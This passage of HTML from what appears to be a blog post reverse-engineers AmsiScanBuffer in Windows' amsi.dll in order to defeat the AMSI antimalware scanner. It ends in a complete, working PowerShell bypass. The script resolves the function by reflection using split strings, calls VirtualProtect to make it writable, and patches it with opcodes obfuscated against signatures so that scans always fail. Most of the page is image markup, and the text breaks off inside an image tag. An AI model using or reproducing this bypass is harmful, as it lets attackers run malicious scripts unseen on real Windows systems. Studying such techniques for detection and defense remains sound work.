srcset="https://miro.medium.com/v2/resize:fit:640/0*-yLptILQYb4SR0Bj.png 640w, https://miro.medium.com/v2/resize:fit:720/0*-yLptILQYb4SR0Bj.png 720w, https://miro.medium.com/v2/resize:fit:750/0*-yLptILQYb4SR0Bj.png 750w, https://miro.medium.com/v2/resize:fit:786/0*-yLptILQYb4SR0Bj.png 786w, https://miro.medium.com/v2/resize:fit:828/0*-yLptILQYb4SR0Bj.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*-yLptILQYb4SR0Bj.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*-yLptILQYb4SR0Bj.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="817" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*-yLptILQYb4SR0Bj.png"></picture></div></div></figure><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of pz"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*R-BFQLaszSlQMUpH.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*R-BFQLaszSlQMUpH.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*R-BFQLaszSlQMUpH.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*R-BFQLaszSlQMUpH.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*R-BFQLaszSlQMUpH.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*R-BFQLaszSlQMUpH.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*R-BFQLaszSlQMUpH.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*R-BFQLaszSlQMUpH.png 640w, https://miro.medium.com/v2/resize:fit:720/0*R-BFQLaszSlQMUpH.png 720w, https://miro.medium.com/v2/resize:fit:750/0*R-BFQLaszSlQMUpH.png 750w, https://miro.medium.com/v2/resize:fit:786/0*R-BFQLaszSlQMUpH.png 786w, https://miro.medium.com/v2/resize:fit:828/0*R-BFQLaszSlQMUpH.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*R-BFQLaszSlQMUpH.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*R-BFQLaszSlQMUpH.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="282" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*R-BFQLaszSlQMUpH.png"></picture></div></div></figure><p id="27c2" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">According to the graph, multiple branches could land the execution on the code block. One path is notable:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="d92d" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">cmp rcx, rax<br>jz short loc_1800082CA</span></pre><p id="565f" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">The code block compares values stored in <strong class="ni gs">RAX </strong>and <strong class="ni gs">RCX,</strong> because RCX and RAX will be overwritten later, it is hard to patch them.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div class="oe of qa"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*7TQujHs9MLR8Tr1Y.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*7TQujHs9MLR8Tr1Y.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*7TQujHs9MLR8Tr1Y.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*7TQujHs9MLR8Tr1Y.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*7TQujHs9MLR8Tr1Y.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*7TQujHs9MLR8Tr1Y.png 1100w, https://miro.medium.com/v2/resize:fit:982/format:webp/0*7TQujHs9MLR8Tr1Y.png 982w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 491px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*7TQujHs9MLR8Tr1Y.png 640w, https://miro.medium.com/v2/resize:fit:720/0*7TQujHs9MLR8Tr1Y.png 720w, https://miro.medium.com/v2/resize:fit:750/0*7TQujHs9MLR8Tr1Y.png 750w, https://miro.medium.com/v2/resize:fit:786/0*7TQujHs9MLR8Tr1Y.png 786w, https://miro.medium.com/v2/resize:fit:828/0*7TQujHs9MLR8Tr1Y.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*7TQujHs9MLR8Tr1Y.png 1100w, https://miro.medium.com/v2/resize:fit:982/0*7TQujHs9MLR8Tr1Y.png 982w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 491px"><img alt="" class="be lp or c" width="491" height="204" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:614/0*7TQujHs9MLR8Tr1Y.png"></picture></div></figure><p id="fb9e" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">If RCX does not equal RCX, the execution will land the following code block. The TEST operation will be performed between <strong class="ni gs">the byte located at the memory address RCX+0x14</strong> and immediate value 4. This means, if the 3rd bit is set in the byte.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="0ef8" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">test byte ptr [rcx+1Ch], 4<br>jz short loc_1800082CA</span></pre><p id="a84b" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">If the result is not equal to 0, the execution lands the following code block:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="d260" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">mov rcx, [rcx+10h]<br>mov r9, rbx<br>mov [r11-50h], rbp<br>mov [r11-58h], r14<br>mov [rsp+88h+var_60], r8d<br>mov [r11-68h], rdx<br>call WPP_SF_qqDqq</span></pre><p id="65c8" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">No conditional jump happens, just follow the execution, and land the following code block. Previously, RSI is set the value stored in RDX, which is the address of buffer.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="dcc9" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">mov rsi, rdx</span></pre><p id="6ef9" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">If RSI is not equal to zero, continue the execution without a conditional jump.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="d9db" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">loc_1800082CA:<br>test rsi, rsi<br>jz short loc_180008337</span></pre><p id="788d" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">The following code block checks if <strong class="ni gs">EDI </strong>is equal to 0. Previously, EDI is set the value stored in <strong class="ni gs">R8D</strong>.</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="b64a" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">mov edi, r8d</span></pre><p id="050f" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">It is obvious, if R8 is 0, then we will finally reach mov eax, 0x80070057<strong class="ni gs"> instruction.</strong></p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="832a" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">test edi, edi<br>jz short loc_180008337</span></pre><p id="6bb9" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Set <strong class="ni gs">R8</strong> as <strong class="ni gs">0</strong> at the entry of function AmsiScanBuffer, continue the execution. We find that AMSI is bypassed.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qb"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*HKxEogB0L0qm_DSr.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*HKxEogB0L0qm_DSr.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*HKxEogB0L0qm_DSr.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*HKxEogB0L0qm_DSr.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*HKxEogB0L0qm_DSr.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*HKxEogB0L0qm_DSr.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*HKxEogB0L0qm_DSr.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*HKxEogB0L0qm_DSr.png 640w, https://miro.medium.com/v2/resize:fit:720/0*HKxEogB0L0qm_DSr.png 720w, https://miro.medium.com/v2/resize:fit:750/0*HKxEogB0L0qm_DSr.png 750w, https://miro.medium.com/v2/resize:fit:786/0*HKxEogB0L0qm_DSr.png 786w, https://miro.medium.com/v2/resize:fit:828/0*HKxEogB0L0qm_DSr.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*HKxEogB0L0qm_DSr.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*HKxEogB0L0qm_DSr.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="94" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*HKxEogB0L0qm_DSr.png"></picture></div></div></figure><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qc"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*535DOtUEucPN4mAi.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*535DOtUEucPN4mAi.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*535DOtUEucPN4mAi.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*535DOtUEucPN4mAi.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*535DOtUEucPN4mAi.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*535DOtUEucPN4mAi.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*535DOtUEucPN4mAi.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*535DOtUEucPN4mAi.png 640w, https://miro.medium.com/v2/resize:fit:720/0*535DOtUEucPN4mAi.png 720w, https://miro.medium.com/v2/resize:fit:750/0*535DOtUEucPN4mAi.png 750w, https://miro.medium.com/v2/resize:fit:786/0*535DOtUEucPN4mAi.png 786w, https://miro.medium.com/v2/resize:fit:828/0*535DOtUEucPN4mAi.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*535DOtUEucPN4mAi.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*535DOtUEucPN4mAi.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="245" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*535DOtUEucPN4mAi.png"></picture></div></div></figure><p id="5383" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">If we try to patch AmsiScanBuffer by setting R8 to 0:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="bbf1" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">xor r8, r8;</span></pre><p id="6b31" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">The opcode is <strong class="ni gs">0x4d31c0.</strong> However, it will crash powershell.exe process, because we overwrote some instructions, such as <strong class="ni gs">mov r11, rsp</strong>. While R11 will be used in some following instructions.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div class="oe of qd"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*anc0ZLd3vYZq2RD_.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*anc0ZLd3vYZq2RD_.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*anc0ZLd3vYZq2RD_.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*anc0ZLd3vYZq2RD_.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*anc0ZLd3vYZq2RD_.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*anc0ZLd3vYZq2RD_.png 1100w, https://miro.medium.com/v2/resize:fit:1032/format:webp/0*anc0ZLd3vYZq2RD_.png 1032w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 516px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*anc0ZLd3vYZq2RD_.png 640w, https://miro.medium.com/v2/resize:fit:720/0*anc0ZLd3vYZq2RD_.png 720w, https://miro.medium.com/v2/resize:fit:750/0*anc0ZLd3vYZq2RD_.png 750w, https://miro.medium.com/v2/resize:fit:786/0*anc0ZLd3vYZq2RD_.png 786w, https://miro.medium.com/v2/resize:fit:828/0*anc0ZLd3vYZq2RD_.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*anc0ZLd3vYZq2RD_.png 1100w, https://miro.medium.com/v2/resize:fit:1032/0*anc0ZLd3vYZq2RD_.png 1032w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 516px"><img alt="" class="be lp or c" width="516" height="101" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:645/0*anc0ZLd3vYZq2RD_.png"></picture></div></figure><figure class="oh oi oj ok ol om oe of paragraph-image"><div class="oe of qe"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*lz-6io2CPLQZ0Hs7.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*lz-6io2CPLQZ0Hs7.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*lz-6io2CPLQZ0Hs7.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*lz-6io2CPLQZ0Hs7.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*lz-6io2CPLQZ0Hs7.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*lz-6io2CPLQZ0Hs7.png 1100w, https://miro.medium.com/v2/resize:fit:1046/format:webp/0*lz-6io2CPLQZ0Hs7.png 1046w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 523px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*lz-6io2CPLQZ0Hs7.png 640w, https://miro.medium.com/v2/resize:fit:720/0*lz-6io2CPLQZ0Hs7.png 720w, https://miro.medium.com/v2/resize:fit:750/0*lz-6io2CPLQZ0Hs7.png 750w, https://miro.medium.com/v2/resize:fit:786/0*lz-6io2CPLQZ0Hs7.png 786w, https://miro.medium.com/v2/resize:fit:828/0*lz-6io2CPLQZ0Hs7.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*lz-6io2CPLQZ0Hs7.png 1100w, https://miro.medium.com/v2/resize:fit:1046/0*lz-6io2CPLQZ0Hs7.png 1046w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 523px"><img alt="" class="be lp or c" width="523" height="140" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:654/0*lz-6io2CPLQZ0Hs7.png"></picture></div></figure><p id="9b5a" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Therefore, this bypass works in theory, but we will have issues when using it in practical without WinDBG.</p><p id="56c3" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">We can also force AmsiScanbuffer to return <strong class="ni gs">E_INVALIDARG </strong>error, the instructions are as follows:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="dba1" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">mov eax, 0x80070057<br>ret</span></pre><p id="acd0" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">The opcode is<strong class="ni gs"> 0xb857000780c3</strong>. However, the opcode is signatured, therefore, we should slightly obfuscate it.</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*N8cNK4Od4Te1qW-t.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*N8cNK4Od4Te1qW-t.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*N8cNK4Od4Te1qW-t.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/0*N8cNK4Od4Te1qW-t.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/0*N8cNK4Od4Te1qW-t.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/0*N8cNK4Od4Te1qW-t.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/0*N8cNK4Od4Te1qW-t.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/0*N8cNK4Od4Te1qW-t.png 640w, https://miro.medium.com/v2/resize:fit:720/0*N8cNK4Od4Te1qW-t.png 720w, https://miro.medium.com/v2/resize:fit:750/0*N8cNK4Od4Te1qW-t.png 750w, https://miro.medium.com/v2/resize:fit:786/0*N8cNK4Od4Te1qW-t.png 786w, https://miro.medium.com/v2/resize:fit:828/0*N8cNK4Od4Te1qW-t.png 828w, https://miro.medium.com/v2/resize:fit:1100/0*N8cNK4Od4Te1qW-t.png 1100w, https://miro.medium.com/v2/resize:fit:1400/0*N8cNK4Od4Te1qW-t.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="be lp or c" width="700" height="611" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:875/0*N8cNK4Od4Te1qW-t.png"></picture></div></div></figure><p id="27b1" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">Final code:</p><pre class="oh oi oj ok ol ph pi pj bm pk ay bh"><span id="7e93" class="pl mj gr pi b bd pm pn l po pp" data-selectable-paragraph="">function LookupFunc {<br>    Param ($moduleName, $functionName)<br>    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |<br>    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].<br>     Equals('System.dll')<br>     }).GetType('Microsoft.Win32.UnsafeNativeMethods')<br>    $tmp=@()<br>    $assem.GetMethods() | ForEach-Object {If($_.Name -like "Ge*P*oc*ddress") {$tmp+=$_}}<br>    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,<br><span class="hljs-meta.prompt">@($</span>moduleName)), $functionName))<br>}<br><br><br>function getDelegateType {<br>    Param (<br>     [Parameter(Position = 0, Mandatory = $True)] [Type[]]<br>     $func, [Parameter(Position = 1)] [Type] $delType = [Void]<br>    )<br>    $type = [AppDomain]::CurrentDomain.<br>    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),<br>[System.Reflection.Emit.AssemblyBuilderAccess]::Run).<br>    DefineDynamicModule('InMemoryModule', $false).<br>    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass,<br>    AutoClass', [System.MulticastDelegate])<br><span class="hljs-meta.prompt"><br>  $</span>type.<br>    DefineConstructor('RTSpecialName, HideBySig, Public',<br>[System.Reflection.CallingConventions]::Standard, $func).<br>     SetImplementationFlags('Runtime, Managed')<br><span class="hljs-meta.prompt"><br>  $</span>type.<br>    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType,<br><span class="hljs-meta.prompt">$</span>func). SetImplementationFlags('Runtime, Managed')<br>    return $type.CreateType()<br>}<br><span class="hljs-meta.prompt"><br><br>$</span>a="A"<br><span class="hljs-meta.prompt">$</span>b="msiS"<br><span class="hljs-meta.prompt">$</span>c="canB"<br><span class="hljs-meta.prompt">$</span>d="uffer"<br><span class="hljs-meta.prompt">[IntPtr]$</span>funcAddr = LookupFunc amsi.dll ($a+$b+$c+$d)<br><span class="hljs-meta.prompt">$</span>oldProtectionBuffer = 0<br><span class="hljs-meta.prompt">$</span>vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))<br><span class="hljs-meta.prompt">$</span>vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)<br><span class="hljs-meta.prompt">$</span>buf = [Byte[]] (0xb8,0x34,0x12,0x07,0x80,0x66,0xb8,0x32,0x00,0xb0,0x57,0xc3)<br>[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 12)</span></pre><p id="73c1" class="pw-post-body-paragraph ng nh gr ni b nj os nl nm nn ot np nq nr ou nt nu nv ov nx ny nz ow ob oc od gk bh" data-selectable-paragraph="">It works well : )</p><figure class="oh oi oj ok ol om oe of paragraph-image"><div role="button" tabindex="0" class="on oo fg op be oq"><div class="oe of qg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/0*4pfK9pvp7NE33hSz.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/0*4pfK9pvp7NE33hSz.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/0*4pfK9pvp7NE33hSz.png 750w, 